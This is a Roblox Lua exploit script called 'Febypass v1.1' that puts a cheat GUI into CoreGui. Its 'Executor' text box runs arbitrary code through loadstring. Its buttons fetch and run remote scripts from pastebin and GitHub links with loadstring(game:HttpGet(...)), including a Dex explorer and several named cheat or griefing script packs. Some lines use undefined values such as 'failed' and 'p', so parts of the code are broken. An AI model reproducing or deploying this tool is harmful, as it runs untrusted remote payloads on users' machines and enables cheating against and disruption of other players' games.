local gui = Instance.new("ScreenGui")
gui.Name = "Febypass"
gui.Parent = game.CoreGui

local screen = Instance.new("Frame")
screen.Size = UDim2.new(0.5, 0, 0.9, 0)
screen.Position = UDim2.new(0.3, 0, 0.0, 0)
screen.BackgroundColor3 = Color3.new( 1, 1, 1)
screen.BorderColor3 = Color3.new( 0, 0, 0)
screen.BorderSizePixel = 2
screen.Active = true
screen.BackgroundTransparency = 0.4
screen.Draggable = true
screen.Parent = gui


local Text = Instance.new("TextLabel")
Text.Size = UDim2.new(0.9, 38, 0.1, 0)
Text.Position = UDim2.new(0.0, 0, 0.0, 0)
Text.BackgroundColor3 = Color3.new(0, 0, 0)
Text.BorderColor3 = Color3.new(0, 0, 0)
Text.BorderSizePixel = p
Text.Text = "Febypass v1.1"
Text.BackgroundTransparency = 0 
Text.TextColor3 = Color3.new(255, 255, 255)
Text.Font = Enum.Font.Code
Text.Parent = screen
Text.TextSize = 20
Text.TextXAlignment = Enum.TextXAlignment.Left

local screen1 = Instance.new("Frame")
screen1.Size = UDim2.new(0.9, 30, 0.7, 22)
screen1.Position = UDim2.new(0.0, 2, 0.2, 3)
screen1.BackgroundColor3 = Color3.new(1, 1, 1)
screen1.BorderColor3 = Color3.new(0, 0, 0)
screen1.BorderSizePixel = 0
screen1.Active = failed
screen1.BackgroundTransparency = 0 
screen1.Draggable = true
screen1.Parent = screen

local screen2 = Instance.new("Frame")
screen2.Size = UDim2.new(0.9, 30, 0.7, 22)
screen2.Position = UDim2.new(0.0, 2, 0.2, 3)
screen2.BackgroundColor3 = Color3.new(1, 1, 1)
screen2.BorderColor3 = Color3.new(0, 0, 0)
screen2.BorderSizePixel = 0
screen2.Active = failed
screen2.BackgroundTransparency = 0 
screen2.Draggable = true
screen2.Parent = screen
screen2.Visible = failed

local executor = Instance.new("TextButton")
executor.Size = UDim2.new(0.5, 0, 0.1, 0)
executor.Position = UDim2.new(0.0, 2, 0.1, 1)
executor.BackgroundColor3 = Color3.new(0, 0, 0)
executor.BorderColor3 = Color3.new(0, 0, 0)
executor.BorderSizePixel = 0
executor.Text = "Executor"
executor.BackgroundTransparency = 0
executor.TextColor3 = Color3.new(255, 255, 255)
executor.Font = Enum.Font.Code
executor.Parent = screen
executor.TextSize = 15
executor.MouseButton1Click:Connect(function()
screen1.Visible = true
screen2.Visible = failed
end)

local scri = Instance.new("TextButton")
scri.Size = UDim2.new(0.4, 31, 0.1, 0)
scri.Position = UDim2.new(0.5, 3, 0.1, 1)
scri.BackgroundColor3 = Color3.new(0, 0, 0)
scri.BorderColor3 = Color3.new(0, 0, 0)
scri.BorderSizePixel = 0
scri.Text = "Scripts SS"
scri.BackgroundTransparency = 0 
scri.TextColor3 = Color3.new(255, 255, 255)
scri.Font = Enum.Font.Code
scri.Parent = screen
scri.TextSize = 15
scri.MouseButton1Click:Connect(function()
screen1.Visible = failed
screen2.Visible = true
end)

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(0.9, 25, 0.7, 25)
ScrollingFrame.Position = UDim2.new(0.0, 5, 0.0, 5)
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame.BorderSizePixel = 2
ScrollingFrame.Parent = screen1


ScrollingFrame.BackgroundTransparency = 0 


local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = ScrollingFrame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(0.9, 35, 0.9, 35)
TextBox.Position = UDim2.new(0.0, 0, 0.0, 0)
TextBox.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox.BorderColor3 = Color3.new(0, 0, 0)
TextBox.BorderSizePixel = 1
TextBox.Text = "FE bypass v1.1"
TextBox.TextColor3 = Color3.new(255, 255, 255)
TextBox.BackgroundTransparency = 0
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 15
TextBox.Parent = ScrollingFrame
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.ClearTextOnFocus = failed
TextBox.MultiLine = true

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = TextBox

local exe = Instance.new("TextButton")
exe.Size = UDim2.new(0.3, 0, 0.1, 11)
exe.Position = UDim2.new(0.0, 5, 0.8, 9)
exe.BackgroundColor3 = Color3.new(0, 0, 0)
exe.BorderColor3 = Color3.new(0, 0, 0)
exe.BorderSizePixel = 0
exe.Text = "Execute"
exe.BackgroundTransparency = 0 
exe.TextColor3 = Color3.new(255, 255, 255)
exe.Font = Enum.Font.Code
exe.Parent = screen1
exe.TextSize = 15
exe.MouseButton1Click:Connect(function()
assert(loadstring(TextBox.Text))()
end)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = exe

local clear = Instance.new("TextButton")
clear.Size = UDim2.new(0.3, 0, 0.1, 11)
clear.Position = UDim2.new(0.1, 82, 0.8, 9)
clear.BackgroundColor3 = Color3.new(0, 0, 0)
clear.BorderColor3 = Color3.new(0, 0, 0)
clear.BorderSizePixel = 0
clear.Text = "Clear"
clear.BackgroundTransparency = 0 
clear.TextColor3 = Color3.new(255, 255, 255)
clear.Font = Enum.Font.Code
clear.Parent = screen1
clear.TextSize = 15
clear.MouseButton1Click:Connect(function()
TextBox.Text = "Clear!"
wait(2)
TextBox.Text = ""
end)

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = clear


local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(0.9, 28, 0.9, 15)
ScrollingFrame.Position = UDim2.new(0.0, 2, 0.0, 2)
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame.BorderSizePixel = 1
ScrollingFrame.Parent = screen2


ScrollingFrame.BackgroundTransparency = 0 

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = ScrollingFrame

local R6 = Instance.new("TextButton")
R6.Size = UDim2.new(0.9, 23, 0.1, 0)
R6.Position = UDim2.new(0.0, 0, 0.0, 0)
R6.BackgroundColor3 = Color3.new(0, 0, 0)
R6.BorderColor3 = Color3.new(0, 0, 0)
R6.BorderSizePixel = 0
R6.Text = "R6"
R6.BackgroundTransparency = 0 
R6.TextColor3 = Color3.new(255, 255, 255)
R6.Font = Enum.Font.Code
R6.Parent = ScrollingFrame
R6.TextSize = 19
R6.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/9BFcHqfK"))("Copyright ERROR_CODE ECCS Co")
end)

local Dex = Instance.new("TextButton")
Dex.Size = UDim2.new(0.9, 23, 0.1, 0)
Dex.Position = UDim2.new(0.0, 0, 0.1, 2)
Dex.BackgroundColor3 = Color3.new(0, 0, 0)
Dex.BorderColor3 = Color3.new(0, 0, 0)
Dex.BorderSizePixel = 0
Dex.Text = "Dex"
Dex.BackgroundTransparency = 0 
Dex.TextColor3 = Color3.new(255, 255, 255)
Dex.Font = Enum.Font.Code
Dex.Parent = ScrollingFrame
Dex.TextSize = 19
Dex.MouseButton1Click:Connect(function()
local __function = loadstring(game:HttpGet("https://github.com/Hosvile/DEX-Explorer/releases/latest/download/main.lua", true))
 
__function(__function)
end)

local scripts = Instance.new("TextButton")
scripts.Size = UDim2.new(0.9, 23, 0.1, 0)
scripts.Position = UDim2.new(0.0, 0, 0.2, 3)
scripts.BackgroundColor3 = Color3.new(0, 0, 0)
scripts.BorderColor3 = Color3.new(0, 0, 0)
scripts.BorderSizePixel = 0
scripts.Text = "Redwood scripts"
scripts.BackgroundTransparency = 0 
scripts.TextColor3 = Color3.new(255, 255, 255)
scripts.Font = Enum.Font.Code
scripts.Parent = ScrollingFrame
scripts.TextSize = 19
scripts.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/The-Elite-Soldier/main/DarkWare'))()
end)

local scr = Instance.new("TextButton")
scr.Size = UDim2.new(0.9, 23, 0.1, 0)
scr.Position = UDim2.new(0.0, 0, 0.3, 5)
scr.BackgroundColor3 = Color3.new(0, 0, 0)
scr.BorderColor3 = Color3.new(0, 0, 0)
scr.BorderSizePixel = 0
scr.Text = "F3x scripts c00lkid"
scr.BackgroundTransparency = 0 
scr.TextColor3 = Color3.new(255, 255, 255)
scr.Font = Enum.Font.Code
scr.Parent = ScrollingFrame
scr.TextSize = 19
scr.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/wik7123/hi/main/copyezskid%20ok"))()
end)

local scr2 = Instance.new("TextButton")
scr2.Size = UDim2.new(0.9, 23, 0.1, 0)
scr2.Position = UDim2.new(0.0, 0, 0.4, 8)
scr2.BackgroundColor3 = Color3.new(0, 0, 0)
scr2.BorderColor3 = Color3.new(0, 0, 0)
scr2.BorderSizePixel = 1
scr2.Text = "project ligma"
scr2.BackgroundTransparency = 0 
scr2.TextColor3 = Color3.new(255, 255, 255)
scr2.Font = Enum.Font.Code
scr2.Parent = ScrollingFrame 
scr2.TextSize = 19
scr2.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/kTqDmWwN"))()
end)